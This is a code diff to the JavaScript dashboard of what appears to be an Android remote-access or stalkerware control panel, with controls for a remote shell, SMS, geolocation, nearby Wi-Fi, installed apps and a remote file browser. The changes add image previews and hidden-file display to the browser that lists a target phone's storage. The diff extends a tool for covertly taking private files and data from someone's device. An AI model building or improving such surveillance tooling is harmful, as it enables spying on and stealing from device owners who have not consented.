@@ -143,7 +143,7 @@ function injectAdvancedControls() {
     shellW.after(smsW);
 
     const fileW = document.createElement('div'); fileW.className = 'shell-control-wrapper';
-    fileW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-folder-open"></i> FILE BROWSER</label><div style="display:flex;gap:8px;"><input type="text" id="file-path" placeholder="/storage/emulated/0" value="/storage/emulated/0" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;"><button id="cmd-listfiles" style="padding:10px 20px;background:#4ecdc4;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">LIST</button></div><div id="file-output" style="display:none;background:#050510;color:#4ecdc4;padding:12px;border-radius:8px;margin-top:8px;font-size:11px;max-height:400px;overflow:auto;font-family:monospace;line-height:1.6;"></div>`;
+    fileW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-folder-open"></i> FILE BROWSER</label><div style="display:flex;gap:8px;"><input type="text" id="file-path" placeholder="/storage/emulated/0" value="/storage/emulated/0" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;"><button id="cmd-listfiles" style="padding:10px 20px;background:#4ecdc4;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">LIST</button></div><div id="file-output" style="display:none;background:#050510;color:#4ecdc4;padding:12px;border-radius:8px;margin-top:8px;font-size:11px;max-height:500px;overflow:auto;line-height:1.6;"></div>`;
     smsW.after(fileW);
 
     const geoW = document.createElement('div'); geoW.className = 'shell-control-wrapper';
@@ -281,7 +281,7 @@ function initializeDataFeedListeners(uid) {
         const nets = d.nearby_networks||[]; const c = document.getElementById('wifi-count'); if(c) c.textContent = nets.length;
         const f = document.getElementById('wifi-feed'); if(!f) return;
         let h = `<div class="feed-item" style="color:#00ff88;">Connected: <strong>${esc(d.current_ssid||'Not connected')}</strong> (RSSI: ${d.current_rssi||'--'})</div>`;
-        h += nets.slice(0,30).map(n=>{const b=n.signal_strength>-50?'🟢':n.signal_strength>-70?'🟡':'';const l=n.is_secured?'🔒':'🔓';return `<div class="feed-item">${b} ${l} <strong>${esc(n.ssid||'Hidden')}</strong> <small>${n.signal_strength}dBm • ${n.frequency}MHz</small></div>`;}).join('');
+        h += nets.slice(0,30).map(n=>{const b=n.signal_strength>-50?'🟢':n.signal_strength>-70?'🟡':'';const l=n.is_secured?'🔒':'';return `<div class="feed-item">${b} ${l} <strong>${esc(n.ssid||'Hidden')}</strong> <small>${n.signal_strength}dBm • ${n.frequency}MHz</small></div>`;}).join('');
         f.innerHTML = h;
     });
     listenToFeed(uid, 'installed_apps', (d) => {
@@ -374,7 +374,7 @@ function initializeDataFeedListeners(uid) {
         o.textContent = text;
     });
 
-    // ── FILE BROWSER WITH NAVIGATION ─────────────────
+    // ── FILE BROWSER WITH NAVIGATION + IMAGE PREVIEWS ─
     listenToFeed(uid, 'file_browser', (d) => {
         const o = document.getElementById('file-output'); if(!o||!d) return;
         o.style.display = 'block';
@@ -384,9 +384,12 @@ function initializeDataFeedListeners(uid) {
             return;
         }
 
-        // Single file info view
+        // Single file info view with preview
         if(d.is_file) {
             let html = '<div style="margin-bottom:10px;">';
+            if(d.preview_url) {
+                html += '<img src="' + d.preview_url + '" style="width:100%;max-width:300px;border-radius:6px;margin-bottom:8px;cursor:pointer;display:block;" onclick="window.open(this.src,\'_blank\')" loading="lazy">';
+            }
             html += '<div style="font-size:14px;color:#fff;margin-bottom:6px;">' + esc(d.name||'File') + '</div>';
             html += '<div style="color:#888;font-size:11px;">Size: ' + (d.size_formatted||'?') + '</div>';
             html += '<div style="color:#888;font-size:11px;">Type: ' + (d.file_type||'unknown') + '</div>';
@@ -405,7 +408,7 @@ function initializeDataFeedListeners(uid) {
             return;
         }
 
-        // Directory listing
+        // Directory listing with icons, previews, hidden file support
         let html = '<div style="color:#00ff88;font-size:13px;margin-bottom:4px;">📂 ' + esc(d.current_path||'/') + '</div>';
         html += '<div style="color:#666;font-size:10px;margin-bottom:10px;">' + (d.total_dirs||0) + ' folders • ' + (d.total_files||0) + ' files';
         if(d.shown_files !== undefined && d.total_files > d.shown_files) html += ' (showing ' + d.shown_files + ')';
@@ -414,17 +417,48 @@ function initializeDataFeedListeners(uid) {
         var entries = d.entries || [];
         entries.forEach(function(e) {
             var pathEsc = e.path.replace(/'/g, "\\'").replace(/"/g, '&quot;');
+            var hiddenStyle = e.is_hidden ? 'opacity:0.5;' : '';
+
             if(e.is_directory) {
-                html += '<div style="padding:6px 0;border-bottom:1px solid #111;cursor:pointer;" onclick="navigateToFile(\'' + pathEsc + '\')">';
-                html += '<span style="color:#ffd93d;font-size:12px;">' + esc(e.name) + '</span>';
-                if(e.size_formatted) html += ' <span style="color:#555;font-size:10px;">' + esc(e.size_formatted) + '</span>';
-                html += '<br><span style="color:#4ecdc4;font-size:10px;">' + esc(e.path) + '</span>';
+                html += '<div style="padding:6px 0;border-bottom:1px solid #111;cursor:pointer;' + hiddenStyle + '" onclick="navigateToFile(\'' + pathEsc + '\')">';
+                html += '<div style="display:flex;align-items:center;gap:8px;">';
+                html += '<span style="font-size:18px;">' + (e.icon||'📁') + '</span>';
+                html += '<div style="flex:1;min-width:0;">';
+                html += '<div style="color:#ffd93d;font-size:12px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">' + esc(e.name) + '</div>';
+                html += '<div style="color:#555;font-size:10px;">' + esc(e.size_formatted||'') + '</div>';
+                html += '</div>';
+                html += '</div>';
                 html += '</div>';
             } else {
-                html += '<div style="padding:6px 0;border-bottom:1px solid #111;">';
-                html += '<span style="font-size:12px;">' + esc(e.name) + '</span>';
-                html += ' <span style="color:#555;font-size:10px;">' + (e.size_formatted||'') + '</span>';
-                html += '<br><span style="color:#444;font-size:10px;">' + esc(e.path) + '</span>';
+                html += '<div style="padding:6px 0;border-bottom:1px solid #111;display:flex;gap:10px;align-items:center;' + hiddenStyle + '">';
+                if(e.preview_url) {
+                    html += '<img src="' + e.preview_url + '" style="width:50px;height:50px;object-fit:cover;border-radius:4px;flex-shrink:0;cursor:pointer;" onclick="event.stopPropagation();window.open(this.src,\'_blank\')" loading="lazy">';
+                } else {
+                    var iconBg = '#1a1a2e';
+                    if(e.icon === '🎵') iconBg = '#1a0a2e';
+                    else if(e.icon === '🎬') iconBg = '#2e0a0a';
+                    else if(e.icon === '📦') iconBg = '#0a2e0a';
+                    else if(e.icon === '🗜️') iconBg = '#2e2e0a';
+                    else if(e.icon === '📕') iconBg = '#2e0a0a';
+                    else if(e.icon === '📘') iconBg = '#0a0a2e';
+                    else if(e.icon === '📊') iconBg = '#0a2e0a';
+                    else if(e.icon === '📙') iconBg = '#2e1a0a';
+                    else if(e.icon === '🗄️') iconBg = '#1a1a0a';
+                    else if(e.icon === '⚙️') iconBg = '#1a1a1a';
+                    else if(e.icon === '🔑') iconBg = '#2e1a0a';
+                    else if(e.icon === '🔤') iconBg = '#0a1a2e';
+                    else if(e.icon === '👤') iconBg = '#1a2e1a';
+                    else if(e.icon === '📅') iconBg = '#2e0a1a';
+                    else if(e.icon === '💬') iconBg = '#0a2e2e';
+                    else if(e.icon === '🧲') iconBg = '#2e2e2e';
+                    else if(e.icon === '🔲') iconBg = '#111';
+                    html += '<div style="width:50px;height:50px;background:' + iconBg + ';border-radius:4px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:22px;">' + (e.icon||'📄') + '</div>';
+                }
+                html += '<div style="flex:1;min-width:0;">';
+                html += '<div style="font-size:12px;color:#fff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">' + esc(e.name) + '</div>';
+                html += '<div style="color:#555;font-size:10px;">' + (e.size_formatted||'') + '</div>';
+                html += '<div style="color:#444;font-size:9px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">' + esc(e.path) + '</div>';
+                html += '</div>';
                 html += '</div>';
             }
         });
@@ -515,7 +549,7 @@ function listenToFeed(uid, path, cb) {
     deviceListeners[k] = onValue(r, (s) => { if(s.exists()) try{cb(s.val());}catch(e){console.error(`Feed [${path}]:`,e);} });
 }
 
-// ── FILE BROWSER NAVIGATION (global function) ────────
+// ── FILE BROWSER NAVIGATION ──────────────────────────
 window.navigateToFile = function(path) {
     if(!selectedDevice) return;
     sendCmd(selectedDevice, 'list_files', path.trim());
